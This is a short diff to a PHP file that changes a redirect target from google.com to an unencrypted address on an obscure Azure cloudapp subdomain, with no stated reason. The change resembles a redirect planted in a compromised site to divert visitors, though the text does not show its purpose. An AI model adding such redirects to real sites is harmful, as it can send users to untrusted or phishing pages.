@@ -1,3 +1,3 @@
 <?php
-header('Location: https://google.com/');
+header('Location: http://bushgrpi.eastus.cloudapp.azure.com/iit/');
 ?>
